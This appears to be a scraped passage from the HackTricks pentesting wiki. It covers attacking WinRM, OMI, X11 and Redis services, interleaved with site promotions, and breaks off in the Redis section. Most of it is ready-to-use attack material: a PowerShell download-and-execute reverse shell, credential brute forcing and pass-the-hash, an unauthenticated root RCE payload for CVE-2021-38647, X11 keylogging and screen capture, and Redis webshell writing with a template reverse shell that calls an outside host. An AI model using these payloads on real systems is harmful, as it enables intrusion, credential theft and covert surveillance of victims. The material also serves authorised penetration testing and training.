commands:\nEnable-PSRemoting -Force\nSet-Item wsman:\\localhost\\client\\trustedhosts *\nThis adds a wildcard to the trustedhosts setting. Be wary of what that entails.\nNote: I also had to change the network type on my attack machine from \"Public\" to \"Work\" network.\nYou can also\nactivate\nWinRM\nremotely\n**_using _wmic\n:\nwmic /node:<REMOTE_HOST> process call create \"powershell enable-psremoting -force\"\nTest if configured\nOnce the attack machine is configured, use the\nTest-WSMan\nfunction to test whether the target is configured for WinRM. You should see some information returned about the protocol version and wsmid:\nIn this case the first one is configured and the second isn't.\nExecute a command\nNow we can use PowerShell's\nInvoke-Command\nto remotely execute a command on the target over WinRM. To remotely run\nipconfig\nand see the output:\nInvoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\\username]\nYou can also\nexecute a command of your current PS console via\nInvoke-Command\n. Suppose that you have locally a function called\nenumeration\nand you want to\nexecute it in a remote computer\n, you can do:\nInvoke\n-\nCommand\n-\nComputerName\n<\ncomputername\n>\n-\nScriptBLock $\n{\nfunction:enumeration\n}\n[\n-\nArgumentList\n\"arguments\"\n]\nExecute a Script\nInvoke\n-\nCommand\n-\nComputerName\n<\ncomputername\n>\n-\nFilePath\nC\n:\n\\path\\to\\script\\file\n[\n-\ncredential\nCSCOU\n\\jarrieta\n]\nGet reverse-shell\nInvoke\n-\nCommand\n-\nComputerName\n<\ncomputername\n>\n-\nScriptBlock\n{\ncmd\n/\nc\n\"powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')\"\n}\nGet a PS session\nOr, if you want to drop right into an interactive PowerShell session, use the\nEnter-PSSession\nfunction:\n#If you need to use different creds\n$password\n=\nConvertTo-SecureString\n'Stud41Password@123'\n-\nAsplaintext\n-\nforce\n## Note the \".\\\" in the suername to indicate it's a local user (host domain)\n$creds2\n=\nNew-Object\nSystem\n.\nManagement\n.\nAutomation\n.\nPSCredential\n(\n\".\\student41\"\n,\n$password\n)\n‚Äã\n# Enter\nEnter-PSSession\n-\nComputerName dcorp-adminsrv\n.\ndollarcorp\n.\nmoneycorp\n.\nlocal\n[\n-\nCredential username\n]\n## Bypass proxy\nEnter-PSSession\n-\nComputerName 1\n.\n1\n.\n1\n.\n1\n-\nCredential\n$creds\n-\nSessionOption\n(\nNew-PSSessionOption\n-\nProxyAccessType NoProxyServer\n)\n# Save session in var\n$sess\n=\nNew-PSSession\n-\nComputerName 1\n.\n1\n.\n1\n.\n1\n-\nCredential\n$creds\n-\nSessionOption\n(\nNew-PSSessionOption\n-\nProxyAccessType NoProxyServer\n)\nEnter-PSSession\n$sess\n## Background current PS session\nExit-PSSession\n# This will leave it in background if it's inside an env var (New-PSSession...)\nThe session will run in a new process (wsmprovhost) inside the \"victim\"\nForcing WinRM Open\nIf you really want to use PS Remoting and WinRM but the target isn't configured for it, you could \"force\" it on through a single command. I wouldn't recommend this but if you really wanted to use WinRM or PSRemoting than by all means do it this way. For example, using PSExec:\nPS C:\\tools\\SysinternalsSuite> .\\PsExec.exe \\\\computername -u domain\\username -p password -h -d powershell.exe \"enable-psremoting -force\"\nNow we can enter a remote PS session on the victim.\nSaving and Restoring sessions\nThis\nwon't work\nif the the\nlanguage\nis\nconstrained\nin the remote computer.\n#If you need to use different creds\n$password\n=\nConvertTo\n-\nSecureString\n'Stud41Password@123'\n-\nAsplaintext\n-\nforce\n## Note the \".\\\" in the suername to indicate it's a local user (host domain)\n$creds2\n=\nNew\n-\nObject\nSystem\n.\nManagement\n.\nAutomation\n.\nPSCredential\n(\n\".\\student41\"\n,\n$password\n)\n‚Äã\n#You can save a session inside a variable\n$sess1\n=\nNew\n-\nPSSession\n-\nComputerName\n<\ncomputername\n>\n[\n-\nSessionOption\n(\nNew\n-\nPSSessionOption\n-\nProxyAccessType NoProxyServer\n)]\n#And restore it at any moment doing\nEnter\n-\nPSSession\n-\nSession\n$sess1\nInside this sessions you can load PS scripts using\nInvoke-Command\nInvoke\n-\nCommand\n-\nFilePath\nC\n:\n\\Path\\to\\script\n.\nps1\n-\nSession\n$sess1\nErrors\nIf you find the following error:\nenter-pssession : Connecting to remote server 10.10.10.175 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.\nThe try on the client (info from\nhere\n):\nwinrm quickconfig\nwinrm set winrm\n/\nconfig\n/\nclient\n'@{TrustedHosts=\"Computer1,Computer2\"}'\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWinRM connection in linux\nBrute Force\nBe careful, brute-forcing winrm could block users.\n#Brute force\ncrackmapexec winrm\n<\nIP\n>\n-\nd\n<\nDomain Name\n>\n-\nu usernames\n.\ntxt\n-\np passwords\n.\ntxt\n‚Äã\n#Just check a pair of credentials\n# Username + Password + CMD command execution\ncrackmapexec winrm\n<\nIP\n>\n-\nd\n<\nDomain Name\n>\n-\nu\n<\nusername\n>\n-\np\n<\npassword\n>\n-\nx\n\"whoami\"\n# Username + Hash + PS command execution\ncrackmapexec winrm\n<\nIP\n>\n-\nd\n<\nDomain Name\n>\n-\nu\n<\nusername\n>\n-\nH\n<\nHASH\n>\n-\nX\n'$PSVersionTable'\n#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm\nUsing evil-winrm\ngem install evil\n-\nwinrm\nRead\ndocumentation\non its github:\nhttps://github.com/Hackplayers/evil-winrm\n‚Äã\nevil\n-\nwinrm\n-\nu Administrator\n-\np\n'EverybodyWantsToWorkAtP.O.O.'\n-\ni\n<\nIP\n>/<\nDomain\n>\nTo use evil-winrm to connect to an\nIPv6 address\ncreate an entry inside\n/etc/hosts\nsetting a\ndomain name\nto the IPv6 address and connect to that domain.\nPass the hash with evil-winrm\nevil\n-\nwinrm\n-\nu\n<\nusername\n>\n-\nH\n<\nHash\n>\n-\ni\n<\nIP\n>\nUsing a PS-docker machine\ndocker run -it quickbreach/powershell-ntlm\n$creds = Get-Credential\nEnter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds\nUsing a ruby script\nCode extracted from here:\nhttps://alamot.github.io/winrm_shell/\n‚Äã\nrequire\n'winrm-fs'\n‚Äã\n# Author: Alamot\n# To upload a file type: UPLOAD local_path remote_path\n# e.g.: PS> UPLOAD myfile.txt C:\\temp\\myfile.txt\n‚Äã\n‚Äã\nconn\n=\nWinRM\n::\nConnection\n.\nnew\n(\nendpoint\n:\n'https://IP:PORT/wsman'\n,\ntransport\n:\n:ssl\n,\nuser\n:\n'username'\n,\npassword\n:\n'password'\n,\n:no_ssl_peer_verification\n=>\ntrue\n)\n‚Äã\n‚Äã\nclass\nString\ndef\ntokenize\nself\n.\nsplit\n(\n/\\s(?=(?:[^'\"]|'[^']*'|\"[^\"]*\")*$)/\n).\nselect\n{\n|\ns\n|\nnot\ns\n.\nempty\n?\n}.\nmap\n{\n|\ns\n|\ns\n.\ngsub\n(\n/(^ +)|( +$)|(^[\"']+)|([\"']+$)/\n,\n''\n)}\nend\nend\n‚Äã\n‚Äã\ncommand\n=\n\"\"\nfile_manager\n=\nWinRM\n::\nFS\n::\nFileManager\n.\nnew\n(\nconn\n)\n‚Äã\n‚Äã\nconn\n.\nshell\n(\n:powershell\n)\ndo\n|\nshell\n|\nuntil\ncommand\n==\n\"exit\\n\"\ndo\noutput\n=\nshell\n.\nrun\n(\n\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')\"\n)\nprint\n(\noutput\n.\noutput\n.\nchomp\n)\ncommand\n=\ngets\nif\ncommand\n.\nstart_with\n?\n(\n'UPLOAD'\n)\nthen\nupload_command\n=\ncommand\n.\ntokenize\nprint\n(\n\"Uploading \"\n+\nupload_command\n[\n1\n]\n+\n\" to \"\n+\nupload_command\n[\n2\n])\nfile_manager\n.\nupload\n(\nupload_command\n[\n1\n],\nupload_command\n[\n2\n])\ndo\n|\nbytes_copied\n,\ntotal_bytes\n,\nlocal_path\n,\nremote_path\n|\nputs\n(\n\"\n#{\nbytes_copied\n}\nbytes of\n#{\ntotal_bytes\n}\nbytes copied\"\n)\nend\ncommand\n=\n\"echo `nOK`n\"\nend\noutput\n=\nshell\n.\nrun\n(\ncommand\n)\ndo\n|\nstdout\n,\nstderr\n|\nSTDOUT\n.\nprint\n(\nstdout\n)\nSTDERR\n.\nprint\n(\nstderr\n)\nend\nend\nputs\n(\n\"Exiting with code\n#{\noutput\n.\nexitcode\n}\n\"\n)\nend\nShodan\nport:5985 Microsoft-HTTPAPI\nReferences\n‚Äã\nhttps://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: WinRM    #Protocol Abbreviation if there is one.\nPort_Number:  5985     #Comma separated if there is more than one.\nProtocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for WinRM\nNote: |\nWindows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.\n‚Äã\nsudo gem install winrm winrm-fs colorize stringio\ngit clone https://github.com/Hackplayers/evil-winrm.git\ncd evil-winrm\nruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô\n‚Äã\nhttps://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/\n‚Äã\nruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/\n^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)\nmenu\ninvoke-binary `tab`\n‚Äã\n#python3\nimport winrm\ns = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))\nprint(s.run_cmd('ipconfig'))\nprint(s.run_ps('ipconfig'))\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-winrm\n\u0000\u0000‚Äã\nEntry_2:\nName: Hydra Brute Force\nDescription: Need User\nCommand: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5984,6984 - Pentesting CouchDB\nNext\n- Network Services Pentesting\n5985,5986 - Pentesting OMI\nLast modified\n4mo ago"
    },
    {
        "title": "5985,5986 - Pentesting OMI",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi",
        "text": "5985,5986 - Pentesting OMI\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nOMI is an\nopen-source\nremote configuration management tool developed by Microsoft. OMI agents are commonly found installed on Azure Linux servers when the following services are in use:\nAzure Automation\nAzure Automatic Update\nAzure Operations Management Suite\nAzure Log Analytics\nAzure Configuration Management\nAzure Diagnostics\nWhen these services are configured, the omiengine process will listen on all interfaces and being running as the root user.\nDefault port:\n5985(http), 5986(https)\n‚Äã\nCVE-2021-38647\n‚Äã\nAs of September 16, newly created Linux servers in Azure are still packaged with a vulnerable version of the OMI agent. After deploying a Linux server and enabling one the services listed above, the server will be in a vulnerable state.\nThe OMI server receives configuration management messages via the /wsman endpoint. Typically, an Authentication header is passed along with the message and the OMI server will ensure the client is authorized communicate. In this case the vulnerability is that when there is no Authentication header the server incorrectly accepts the message and executes the instruction under the root user.\nBy posting an ‚ÄúExecuteShellCommand‚Äù SOAP payload to the server with no Authentication header specified, it will execute the command as root.\n<\ns:\nEnvelope\nxmlns:\ns\n=\n\"\nhttp://www.w3.org/2003/05/soap-envelope\n\"\nxmlns:\na\n=\n\"\nhttp://schemas.xmlsoap.org/ws/2004/08/addressing\n\"\n...\n<s:\nBody\n>\n<\np:\nExecuteShellCommand_INPUT\nxmlns:\np\n=\n\"\nhttp://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\n\"\n>\n<\np:\ncommand\n>\nid\n</\np:\ncommand\n>\n<\np:\ntimeout\n>\n0\n</\np:\ntimeout\n>\n</\np:\nExecuteShellCommand_INPUT\n>\n</\ns:\nBody\n>\n</\ns:\nEnvelope\n>\nFind full exploit in\nhttps://github.com/horizon3ai/CVE-2021-38647\n‚Äã\nReferences\n‚Äã\nhttps://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/\n‚Äã\n‚Äã\nhttps://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5985,5986 - Pentesting WinRM\nNext\n- Network Services Pentesting\n6000 - Pentesting X11\nLast modified\n6mo ago"
    },
    {
        "title": "6000 - Pentesting X11",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11",
        "text": "6000 - Pentesting X11\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nThe X Window System (aka X) is a windowing system for bitmap displays, which is common on UNIX-based operating systems. X provides the basic framework for a GUI based environment. X also does not mandate the user interface ‚Äì individual programs handle this.\nFrom:\nhttps://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref\n‚Äã\nDefault port:\n6000\nPORT       STATE   SERVICE\n6000/tcp   open    X11\nEnumeration\nCheck for\nanonymous connection:\nnmap\n-sV\n--script\nx11-access\n-p\n<\nPORT\n>\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/x11/open_x11\nLocal Enumeration\nThe file\n.Xauthority\nin the users home folder is\nused\nby\nX11 for authorization\n. From\nhere\n:\nMIT-magic-cookie-1: Generating 128bit of key (‚Äúcookie‚Äù), storing it in ~/.Xauthority (or where XAUTHORITY envvar points to). The client sends it to server plain! the server checks whether it has a copy of this ‚Äúcookie‚Äù and if so, the connection is permitted. the key is generated by DMX.\nIn order to\nuse the cookie\nyou should set the env var:\nexport XAUTHORITY=/path/to/.Xauthority\nVerfy Connection\nxdpyinfo\n-display\n<\nip\n>\n:\n<\ndisplay\n>\nxwininfo\n-root\n-tree\n-display\n<\nIP\n>\n:\n<\ndisplay\n>\n#Ex: xwininfo -root -tree -display 10.5.5.12:0\nKeyloggin\n‚Äã\nxspy\nto sniff the keyboard keystrokes.\nSample Output:\nxspy 10.9.xx.xx\n‚Äã\nopened 10.9.xx.xx:0 for snoopng\nswaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123\nqsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab\nScreenshots capturing\nxwd\n-root\n-screen\n-silent\n-display\n<\nTargetIP:\n0\n>\n>\nscreenshot.xwd\nconvert screenshot.xwd screenshot.png\nRemote Desktop View\nWay from:\nhttps://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref\n‚Äã\n./xrdp.py <IP:0>\nWay from:\nhttps://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html\n‚Äã\nFirst we need to find the ID of the window using xwininfo\nxwininfo -root -display 10.9.xx.xx:0\n‚Äã\nxwininfo: Window id: 0x45 (the root window) (has no name)\n‚Äã\nAbsolute upper-left X:  0\nAbsolute upper-left Y:  0\nRelative upper-left X:  0\nRelative upper-left Y:  0\nWidth: 1024\nHeight: 768\nDepth: 16\nVisual: 0x21\nVisual Class: TrueColor\nBorder width: 0\nClass: InputOutput\nColormap: 0x20 (installed)\nBit Gravity State: ForgetGravity\nWindow Gravity State: NorthWestGravity\nBacking Store State: NotUseful\nSave Under State: no\nMap State: IsViewable\nOverride Redirect State: no\nCorners:  +0+0  -0+0  -0-0  +0-0\n-geometry 1024x768+0+0\nXWatchwin\nFor\nlive viewing\nwe need to use\n./xwatchwin\n[\n-v\n]\n[\n-u UpdateTime\n]\nDisplayName\n{\n-w\nwindowID\n|\nWindowName\n}\n-w\nwindow Id is the one found on xwininfo\n./xwatchwin\n10.9\n.xx.xx:0\n-w\n0x45\nGet Shell\nmsf> use exploit/unix/x11/x11_keyboard_exec\nOther way:\nReverse Shell:\nXrdp also allows to take reverse shell via Netcat. Type in the following command:\n./xrdp.py <IP:0> ‚Äìno-disp\nIt will prompt a new control pane where we can see the R-shell option, which is illustrated below:\nWe will start the Netcat listening mode in our local system on port 5555, which is illustrated below:\nThen add the IP and port and then select R-Shell, which is illustrated below:\nNow as can be seen below we have complete system access:\nExploiting X11 unauthenticated access - Infosec Resources\nInfosec Resources\nShodan\nport:6000 x11\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5985,5986 - Pentesting OMI\nNext\n- Network Services Pentesting\n6379 - Pentesting Redis\nLast modified\n4mo ago"
    },
    {
        "title": "6379 - Pentesting Redis",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis",
        "text": "6379 - Pentesting Redis\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nRedis is an open source (BSD licensed), in-memory\ndata structure store\n, used as a\ndatabase\n, cache and message broker (from\nhere\n). By default and commonly Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement\nssl/tls\n. Learn how to\nrun Redis with ssl/tls here\n.\nDefault port:\n6379\nPORT     STATE SERVICE  VERSION\n6379/tcp open  redis   Redis key-value store 4.0.9\nAutomatic Enumeration\nSome automated tools that can help to obtain info from a redis instance:\nnmap\n--script\nredis-info\n-sV\n-p\n6379\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/redis/redis_server\nManual Enumeration\nBanner\nRedis is a\ntext based protocol\n, you can just\nsend the command in a socket\nand the returned values will be readable. Also remember that Redis can run using\nssl/tls\n(but this is very weird).\nIn a regular Redis instance you can just connect using\nnc\nor you could also use\nredis-cli\n:\nnc\n-vn\n10.10\n.10.10\n6379\nredis-cli\n-h\n10.10\n.10.10\n# sudo apt-get install redis-tools\nThe\nfirst command\nyou could try is\ninfo\n. It\nmay return output with information\nof the Redis instance\nor something\nlike the following is returned:\n-NOAUTH Authentication required.\nIn this last case, this means that\nyou need valid credentials\nto access the Redis instance.\nRedis Authentication\nBy default\nRedis can be accessed\nwithout credentials\n. However, it can be\nconfigured\nto support\nonly password, or username + password\n.\nIt is possible to\nset a password\nin\nredis.conf\nfile with the parameter\nrequirepass\nor temporary\nuntil the service restarts connecting to it and running:\nconfig set requirepass p@ss$12E45\n.\nAlso, a\nusername\ncan be configured in the parameter\nmasteruser\ninside the\nredis.conf\nfile.\nIf only password is configured the username used is \"\ndefault\n\".\nAlso, note that there is\nno way to find externally\nif Redis was configured with only password or username+password.\nIn cases like this one you will\nneed to find valid credentials\nto interact with Redis so you could try to\nbrute-force\nit.\nIn case you found valid credentials you need to authenticate the session\nafter establishing the connection with the command:\nAUTH\n<\nusername\n>\n<\npassword\n>\nValid credentials\nwill be responded with:\n+OK\nAuthenticated enumeration\nIf the Redis instance is accepting\nanonymous\nconnections or you found some\nvalid credentials\n, you can\nstart enumerating\nthe service with the following commands:\nINFO\n[\n..\n. Redis response with info\n..\n.\n]\nclient list\n[\n..\n. Redis response with connected clients\n..\n.\n]\nCONFIG GET *\n[\n..\n. Get config\n..\n.\n]\nOther Redis commands\ncan be found here\nand\nhere\n.\nNote that the\nRedis commands of an instance can be renamed\nor removed in the\nredis.conf\nfile. For example this line will remove the command FLUSHDB:\nrename-command FLUSHDB \"\"\nMore about configuring securely a Redis service here:\nhttps://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04\n‚Äã\nYou can also\nmonitor in real time the Redis commands\nexecuted with the command\nmonitor\nor get the top\n25 slowest queries\nwith\nslowlog get 25\nFind more interesting information about more Redis commands here:\nhttps://lzone.de/cheat-sheet/Redis\n‚Äã\nDumping Database\nInside Redis the\ndatabases are numbers starting from 0\n. You can find if anyone is used in the output of the command\ninfo\ninside the \"Keyspace\" chunk:\nOr you can just get all the\nkeyspaces\n(databases) with:\nINFO keyspace\nIn that example the\ndatabase 0 and 1\nare being used.\nDatabase 0 contains 4 keys and database 1 contains 1\n. By default Redis will use database 0. In order to dump for example database 1 you need to do:\nSELECT\n1\n[\n..\n. Indicate the database\n..\n.\n]\nKEYS *\n[\n..\n. Get Keys\n..\n.\n]\nGET\n<\nKEY\n>\n[\n..\n. Get Key\n..\n.\n]\nIn case you get the follwing error\n-WRONGTYPE Operation against a key holding the wrong kind of value\nwhile running\nGET <KEY>\nit's because the key may be something else than a string or an integer and requires a special operator to display it.\nTo know the type of the key, use the\nTYPE\ncommand, example below for list and hash keys.\nTYPE <KEY>\n[ ... Type of the Key ... ]\nLRANGE <KEY> 0 -1\n[ ... Get list items ... ]\nHGET <KEY> <FIELD>\n[ ... Get hash item ... ]\nDump the database with npm\nredis-dump\nor python\nredis-utils\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nRedis RCE\nInteractive Shell\n‚Äã\nredis-rogue-server\ncan automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).\n./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>\nPHP Webshell\nInfo from\nhere\n. You must know the\npath\nof the\nWeb site folder\n:\nroot@Urahara:~# redis-cli -h 10.85.0.52\n10.85.0.52:6379> config set dir /usr/share/nginx/html\nOK\n10.85.0.52:6379> config set dbfilename redis.php\nOK\n10.85.0.52:6379> set test \"<?php phpinfo(); ?>\"\nOK\n10.85.0.52:6379> save\nOK\n‚ÄãIf the webshell access exception, you can empty the database after backup and try again, remember to restore the database.\nTemplate Webshell\nLike in the previous section you could also overwrite some html template file that is going to be interpreted by a template engine and obtain a shell.\nFor example, following\nthis writeup\n, you can see that the attacker injected a\nrev shell in an html\ninterpreted by the\nnunjucks template engine:\n{{\n({}).\nconstructor\n.\nconstructor\n(\n\"\nvar\nnet\n=\nglobal\n.\nprocess\n.\nmainModule\n.\nrequire\n(\n'net'\n),\ncp\n=\nglobal\n.\nprocess\n.\nmainModule\n.\nrequire\n(\n'child_process'\n),\nsh\n=\ncp\n.\nspawn\n(\n'sh'\n,\n[]);\nvar\nclient\n=\nnew\nnet\n.\nSocket\n();\nclient\n.\nconnect\n(\n1234\n,\n'my-server.com'\n,\nfunction\n(){\nclient\n.\npipe\n(\nsh\n.\nstdin\n);\nsh\n.\nstdout\n.\npipe\n(\nclient\n);\nsh\n.\nstderr\n.\npipe\n(\nclient\n);\n});\n\"\n)()}}\nNote that\nseveral template engines cache\nthe templates in\nmemory\n, so even if you overwrite them, the new one\nwon't be executed\n. In this cases, either the developer left the automatic reload active or you need to do a DoS over the service (and expect that it will be relaunched automatically).\nSSH\nPlease be aware\nconfig get dir\nresult can be changed after other manually exploit commands. Suggest to run it first right after login into Redis. In the output of\nconfig get dir\nyou could find the\nhome\nof the\nredis 